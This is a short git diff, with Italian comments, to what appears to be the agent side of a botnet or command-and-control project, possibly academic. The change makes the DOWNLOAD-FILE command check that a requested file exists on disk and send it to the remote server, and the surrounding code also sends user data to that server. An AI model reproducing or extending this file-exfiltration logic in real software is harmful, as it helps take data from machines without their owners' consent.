@@ -6,6 +6,7 @@ Scritto da:
        Francesco Ciccarelli, Giulia Caputo
 Copyright (c) 2022. All rights reserved.
 """
+import os  # Utilizzato per il controllo dell'esistenza del file (Alternativamente è possibile utilizzare path -> path('dir/myfile.txt').abspath())
 import asyncio
 from datetime import datetime as dt
 from . import bot_slave_utilities as bot_utils
@@ -53,7 +54,13 @@ async def command_to_execute(writer: asyncio.StreamWriter, case: str) -> None:
                 writer.write(user_data.encode())
                 await asyncio.sleep(1)
         case 'DOWNLOAD-FILE':
-            await bot_utils.send_file("test.png", 8192, writer)  # TODO: Generalizza file
+            request = "test.png"  # Atm il file è hardcoded -> In questo punto facciamo stripping della request ricevuta dal server e controlliamo se esiste sul disco il file richiesto
+            if os.path.exists(os.path.abspath(request)):  # Controlliamo che il file richiesto esista
+                print(f"PATH: {os.path.abspath(request)}")
+                await bot_utils.send_file(request, 8192, writer)
+            else:
+                print(f"File {os.path.abspath(request)} non presente sul file system")  # In caso contrario avvisiamo il server dell'errore
+                writer.write(b"Il file richiesto non e' valido")  # (TODO: Aggiungere un header per coprire questo caso)
         case _:
             return "NULL"
 
